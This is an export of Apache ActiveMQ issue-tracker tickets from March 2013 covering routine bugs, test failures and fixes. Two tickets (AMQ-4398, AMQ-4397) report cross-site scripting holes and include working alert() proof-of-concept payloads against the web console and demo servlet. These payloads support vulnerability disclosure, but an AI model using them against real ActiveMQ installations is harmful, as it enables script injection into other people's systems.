Typo in PooledConnectionFactory.java,AMQ-4410,12639307,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,dguggi,dguggi,27/Mar/13 13:25,27/Mar/13 14:19,14/Jul/23 05:43,27/Mar/13 14:19,5.8.0,,,,,5.9.0,,,Pool,,,,0,,,,,,,,,"Method ""public long setTimeBetweenExpirationCheckMillis()"" should be ""public long getTimeBetweenExpirationCheckMillis()""",,dguggi,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,319777,,,Wed Mar 27 14:19:54 UTC 2013,,,,,,,,,,,"0|i1j6br:",320118,,,,,,,,,,,,,,,,,,,,,"27/Mar/13 14:19;tabish;fixed on trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation is wrong about default value for wireFormat.tcpNoDelayEnabled,AMQ-4409,12639286,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,qerub,qerub,27/Mar/13 11:17,27/Mar/13 14:35,14/Jul/23 05:43,27/Mar/13 14:35,5.8.0,,,,,,,,,,,,0,,,,,,,,,"http://activemq.apache.org/configuring-wire-formats.html states that the default value for {{tcpNoDelayEnabled}} is false.

This contradicts what the debug logs says if I don't change the parameter:

{noformat}
12:10:06.827 DEBUG org.apache.activemq.transport.InactivityMonitor - Using min of local: WireFormatInfo { version=9, properties={MaxFrameSize=9223372036854775807, CacheSize=1024, CacheEnabled=true, SizePrefixDisabled=false, MaxInactivityDurationInitalDelay=10000, TcpNoDelayEnabled=true, MaxInactivityDuration=30000, TightEncodingEnabled=true, StackTraceEnabled=true}, magic=[A,c,t,i,v,e,M,Q]} and remote: WireFormatInfo { version=9, properties={CacheSize=1024, MaxFrameSize=31337, CacheEnabled=true, SizePrefixDisabled=false, TcpNoDelayEnabled=true, MaxInactivityDurationInitalDelay=10000, MaxInactivityDuration=15000, TightEncodingEnabled=true, StackTraceEnabled=true}, magic=[A,c,t,i,v,e,M,Q]}
{noformat}

Note the {{TcpNoDelayEnabled=true}}!

This default value seems to come from {{org/apache/activemq/openwire/OpenWireFormatFactory.java}} which states

{noformat}
private boolean tcpNoDelayEnabled = true;
{noformat}

I think that either the documentation or the code should be updated.
",,qerub,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,319756,,,Wed Mar 27 14:35:04 UTC 2013,,,,,,,,,,,"0|i1j673:",320097,,,,,,,,,,,,,,,,,,,,,"27/Mar/13 14:35;tabish;updated doco;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
no network bridge loopback suppression with url scheme mismatch,AMQ-4408,12639218,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,26/Mar/13 22:50,26/Mar/13 22:58,14/Jul/23 05:43,26/Mar/13 22:58,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"loopback suppression in most cases is picked up by a filter. but when the transport connector uses a url of {code}nio://x:y{code} and the network connector uses {code}tcp://x:y{code} the text based comparison fails.
From https://issues.apache.org/jira/browse/AMQ-4082 the comparison of broker ids is skipped in error. ",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4082,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,319688,,,Tue Mar 26 22:58:21 UTC 2013,,,,,,,,,,,"0|i1j5rz:",320029,,,,,,,,,,,,,,,,,,,,,"26/Mar/13 22:58;gtully;fix in http://svn.apache.org/r1461362;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
mKahaDB: PageFile is not loaded when recreating queue,AMQ-4407,12639118,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,juan.nin,juan.nin,26/Mar/13 15:41,28/Mar/13 04:34,14/Jul/23 05:43,27/Mar/13 11:25,5.8.0,,,,,5.9.0,,,,,,,0,mKahaDB,,,,,,,,"Using mKahaDB, we create a queue, delete it through the admin interface, and attempt to recreate it, receiving the error below on the client. 

2013-03-08 10:29:17,903 | WARN  | Async error occurred: java.lang.IllegalStateException: PageFile is not loaded | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: tcp:///0:0:0:0:0:0:0:1%0:65222@61613
java.lang.IllegalStateException: PageFile is not loaded
	at org.apache.activemq.store.kahadb.disk.page.PageFile.assertLoaded(PageFile.java:809)
	at org.apache.activemq.store.kahadb.disk.page.PageFile.tx(PageFile.java:303)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.getMessageCount(KahaDBStore.java:478)
	at org.apache.activemq.store.ProxyMessageStore.getMessageCount(ProxyMessageStore.java:101)
	at org.apache.activemq.store.ProxyMessageStore.getMessageCount(ProxyMessageStore.java:101)
	at org.apache.activemq.broker.region.Queue.initialize(Queue.java:376)
	at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:87)
	at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:526)
	at org.apache.activemq.broker.jmx.ManagedQueueRegion.createDestination(ManagedQueueRegion.java:56)
	at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:136)
	at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:277)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:387)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:282)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:317)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:499)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:749)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:45)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288)
	at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:84)
	at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:195)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:321)
	at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:233)
	at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:73)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:680)
2013-03-08 10:29:17,905 | WARN  | Exception occurred processing: 
null: java.lang.IllegalStateException: PageFile is not loaded | org.apache.activemq.transport.stomp.ProtocolConverter | ActiveMQ Connection Dispatcher: tcp://0:0:0:0:0:0:0:1%0:65222",,boday,gtully,juan.nin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Mar/13 15:44;juan.nin;AMQ4407Test.java;https://issues.apache.org/jira/secure/attachment/12575528/AMQ4407Test.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,319588,,,Thu Mar 28 04:34:47 UTC 2013,,,,,,,,,,,"0|i1j55r:",319929,,,,,,,,,,,,,,,,,,,,,"26/Mar/13 15:42;juan.nin;For full description of the issue see: http://mail-archives.apache.org/mod_mbox/activemq-users/201303.mbox/%3CCAL52o-03mHtrUtvvXUDF-aB=WBJtV=ABWCEWWsN7xnDHNo+7iw@mail.gmail.com%3E;;;","26/Mar/13 15:44;juan.nin;Unit test attached, thanks to Jorge Davison.;;;","27/Mar/13 11:25;gtully;Thanks for the great unit test.
fix in http://svn.apache.org/r1461528

U can verify in tonights 5.9-snapshot;;;","28/Mar/13 04:34;juan.nin;Wow, that was fast, thank you very much!  :);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.bugs.LoadBalanceTest fails intermittently,AMQ-4400,12638584,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,22/Mar/13 20:12,22/Mar/13 20:25,14/Jul/23 05:43,22/Mar/13 20:25,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,"This is one of those once in a blue moon failures, but it just failed on fuse CI the other night.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Mar/13 20:14;kearls;AMQ-4400.patch;https://issues.apache.org/jira/secure/attachment/12575092/AMQ-4400.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,319060,,,Fri Mar 22 20:25:00 UTC 2013,,,,,,,Patch Available,,,,"0|i1j1wf:",319401,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"22/Mar/13 20:14;kearls;Updated to make sure the consumers are started before the producer starts, and give them a little more time to finish.;;;","22/Mar/13 20:25;tabish;patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
XSS vulnerability in demo web application ,AMQ-4398,12638204,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,21/Mar/13 10:27,21/Mar/13 13:28,14/Jul/23 05:43,21/Mar/13 13:28,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"Portfolio publisher servlet doesn't sanitize input. For example he following url in Firefox 

http://localhost:8161/demo/portfolioPublish?count=1&refresh=%27%3E%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E&stocks=IBMW&stocks=BEAS&stocks=MSFT&stocks=SUNW

will trigger JS code.",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,318680,,,Thu Mar 21 13:28:44 UTC 2013,,,,,,,,,,,"0|i1izjz:",319021,,,,,,,,,,,,,,,,,,,,,"21/Mar/13 13:28;dejanb;fixed with svn revision 1459301;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
XSS vulnerability in scheduled.jsp,AMQ-4397,12638203,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,21/Mar/13 10:14,23/Apr/13 08:17,14/Jul/23 05:43,21/Mar/13 12:36,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"If string like {{* * * * *<script>alert(1)</script>}} is entered into cron of a message, JS code will be executed on the scheduled.jsp page.",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,318679,,,Thu Mar 21 12:36:43 UTC 2013,,,,,,,,,,,"0|i1izjr:",319020,,,,,,,,,,,,,,,,,,,,,"21/Mar/13 12:36;dejanb;Fixed with svn revision 1459265. Thanks to Gursev Kalra for reporting.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Web console do not show connections info,AMQ-4393,12638006,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,tabish,hengyunabc,hengyunabc,20/Mar/13 15:53,20/Mar/13 17:43,14/Jul/23 05:43,20/Mar/13 16:22,5.8.0,,,,,5.9.0,,,JMX,,,,0,,,,,,,,,"The url:http://localhost:8161/admin/connections.jsp
ActiveMQ5.5.0, this page will show then connections info. 
ActiveMQ5.8.0, this page will show nothing. 

Because the objectname of MBean have changed. 
5.5.0: 
org.apache.activemq:BrokerName=localhost,Type=Connector,ConnectorName=openwire 
5.5.8: 
org.apache.activemq:type=Broker,brokerName=localhost,connector=clientConnectors,connectorName=openwire 

So, to fix this, org.apache.activemq.web.BrokerFacadeSupport: 

{code}

    public Collection<String> getConnections(String connectorName) throws Exception { 
        String brokerName = getBrokerName(); 
//        ObjectName query = new ObjectName(""org.apache.activemq:type=Broker,brokerName="" + brokerName 
//                + "",connector=clientConnectors,connectorName="" + connectorName + "",connectionName=*""); 

      ObjectName query = new ObjectName(""org.apache.activemq:type=Broker,brokerName="" + brokerName 
      + "",connector=clientConnectors,connectorName="" + connectorName + "",connectionViewType=clientId"" + "",connectionName=*"");   
    ... 
} 

{code}",,hengyunabc,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4314,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,318484,,,Wed Mar 20 16:22:52 UTC 2013,,,,,,,Patch Available,,,,"0|i1iycf:",318825,,,,,,,,,,,,,,,,,,,,,"20/Mar/13 16:22;tabish;Fixed, connections now show up correctly.  Thanks for the patch. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MQTT BlockingConnection disconnect doesn't disconnects the client connection,AMQ-4392,12637972,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,pmarques,pmarques,20/Mar/13 13:08,23/Apr/13 17:04,14/Jul/23 05:43,20/Mar/13 15:57,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"The disconnect method doesn't work (especially when a client id is supplied).

If the connection object is reused, the client throws the following exception:
{code}
java.lang.IllegalStateException: Already connected
	at org.fusesource.mqtt.client.CallbackConnection.connect(CallbackConnection.java:109)
	at org.fusesource.mqtt.client.FutureConnection$2.run(FutureConnection.java:94)
	at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:96)
	at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)
{code}

If the connection object is not reused and the client id is, the client throws the following exception:
{code}
java.io.IOException: Could not connect: CONNECTION_REFUSED_SERVER_UNAVAILABLE
	at org.fusesource.mqtt.client.CallbackConnection$LoginHandler$1.onTransportCommand(CallbackConnection.java:313)
	at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:660)
	at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538)
	at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:226)
	at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:96)
	at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)
{code}

and, the server logs the following messages:
{noformat}
2013-03-20 11:36:04,893 WARN  [org.apache.activemq.broker.TransportConnection] (ActiveMQ Transport: tcp:///192.168.205.2:59401@1883) Failed to add Connection ID:TestServer-58505-1363685123521-2:34, reason: javax.jms.InvalidClientIDException: Broker: localhost - Client: test_id already connected from tcp://192.168.205.2:59398
2013-03-20 11:36:04,893 WARN  [org.apache.activemq.broker.TransportConnection.Transport] (ActiveMQ Transport: tcp:///192.168.205.2:59401@1883) Transport Connection to: tcp://192.168.205.2:59401 failed: java.io.IOException: Broker: localhost - Client: test_id already connected from tcp://192.168.205.2:59398
2013-03-20 11:37:59,867 WARN  [org.apache.activemq.broker.TransportConnection.Transport] (MQTTInactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@c7892e[State = 0, empty queue]) Transport Connection to: tcp://192.168.205.2:59398 failed: org.apache.activemq.transport.InactivityIOException: Channel was inactive for too (>45000) long: tcp://192.168.205.2:59398
{noformat} 

Code example (reusing connection):
{code}
MQTT mqtt = new MQTT();
mqtt.setHost(url);
mqtt.setUserName(user);
mqtt.setPassword(password);
BlockingConnection connection = mqtt.blockingConnection();

int i = 0;
while (true) {
	connection.connect();
	String message = ""TestMessage: "" + i;
	connection.publish(""VendorOrderTopic"", message.getBytes(), QoS.AT_LEAST_ONCE, false);
	System.out.println(""Vendor: Sent message."");

	Thread.sleep(2500);
	connection.disconnect();
	Thread.sleep(2500);
	i++;
}
{code}

Code example (multiple connections):
{code}
MQTT mqtt = new MQTT();
mqtt.setHost(url);
mqtt.setUserName(user);
mqtt.setPassword(password);
mqtt.setClientId(""test_id"");

int i = 0;
while (true) {
	BlockingConnection connection = mqtt.blockingConnection();
	connection.connect();
	String message = ""TestMessage: "" + i;
	connection.publish(""VendorOrderTopic"", message.getBytes(), QoS.AT_LEAST_ONCE, false);
	System.out.println(""Vendor: Sent message."");

	Thread.sleep(2500);
	connection.disconnect();
	Thread.sleep(2500);
	i++;
}
{code}
This problem also occurs when using the eclipse paho client API.

",,minkim,pmarques,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,318450,,,Tue Apr 23 17:04:32 UTC 2013,,,,,,,,,,,"0|i1iy4v:",318791,,,,,,,,,,,,,,,,,,,,,"20/Mar/13 15:39;tabish;In the case of the first code snippet it appears to be a client issue, the broker is registering the disconnect, but the client doesn't seem to reset itself to a usable state as the second connect call never reaches the broker.

In the second snippet there appears to be a bug on the Broker side. ;;;","20/Mar/13 15:57;tabish;Fixed, client's weren't getting unregistered from the Broker. Still will see issues with your first case since its on the client end, but the second case should be better now. ;;;","20/Mar/13 15:57;tabish;Fixed on trunk, will be in the next nightly. ;;;","21/Apr/13 09:33;minkim;I could be wrong about this, but don't you need to do the same in onTransportError() as well?

onTransportError() called from the inactivity monitor would also not unregister from the broker properly. right?;;;","23/Apr/13 17:04;tabish;If you believe that there are lingering issues then the way to determine is with a test cause that validates your assumptions.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQ4351Test fails on slow boxes,AMQ-4389,12637817,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,19/Mar/13 20:29,19/Mar/13 21:02,14/Jul/23 05:43,19/Mar/13 21:02,,,,,,,,,Test Cases,,,,0,,,,,,,,,,"Windows Server 2008, RHEL, and several others",kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/13 20:30;kearls;AMQ-4389.patch;https://issues.apache.org/jira/secure/attachment/12574398/AMQ-4389.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,318297,,,Tue Mar 19 21:02:54 UTC 2013,,,,,,,Patch Available,,,,"0|i1ix6v:",318638,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"19/Mar/13 20:30;kearls;Added CountdownLatches to make sure consumers have started/shutdown as required;;;","19/Mar/13 21:02;tabish;patch applied, thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.activemq.bugs.AMQ3625Test fails on Windows,AMQ-4388,12637647,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,18/Mar/13 21:22,18/Mar/13 21:29,14/Jul/23 05:43,18/Mar/13 21:29,,,,,,,,,,,,,0,,,,,,,,,"I think this is the last of the tests which ironically fail because of the use of platform specific File.seperator.
","32 bit Windows Server 2008,  jdk7",kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Mar/13 21:24;kearls;AMQ-4388.patch;https://issues.apache.org/jira/secure/attachment/12574229/AMQ-4388.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,318127,,,Mon Mar 18 21:29:53 UTC 2013,,,,,,,Patch Available,,,,"0|i1iw53:",318468,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"18/Mar/13 21:29;tabish;Fixed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQ4126Test has additional test failures on Windows,AMQ-4387,12637643,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,18/Mar/13 21:11,18/Mar/13 21:30,14/Jul/23 05:43,18/Mar/13 21:30,,,,,,,,,,,,,0,,,,,,,,,"All test cases are failing on windows, where only testStompNIOSSLWithCertificate fails on mac or ubuntu","Windows 2008 Server, JDK7",kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Mar/13 21:13;kearls;AMQ-4387.patch;https://issues.apache.org/jira/secure/attachment/12574227/AMQ-4387.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,318123,,,Mon Mar 18 21:30:18 UTC 2013,,,,,,,Patch Available,,,,"0|i1iw47:",318464,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"18/Mar/13 21:30;tabish;patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQ4133Test has 2 additional test case failures on Windows,AMQ-4386,12637636,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,18/Mar/13 20:45,18/Mar/13 21:08,14/Jul/23 05:43,18/Mar/13 21:08,,,,,,,,,Test Cases,,,,0,,,,,,,,,"4 out of 4 test cases fail on Windows, as opposed to 2 out of 4 on mac os x.","Windows 2008 server, jdk7",kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Mar/13 20:48;kearls;AMQ-4386.patch;https://issues.apache.org/jira/secure/attachment/12574212/AMQ-4386.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,318116,,,Mon Mar 18 21:08:11 UTC 2013,,,,,,,Patch Available,,,,"0|i1iw2n:",318457,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"18/Mar/13 21:08;tabish;patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
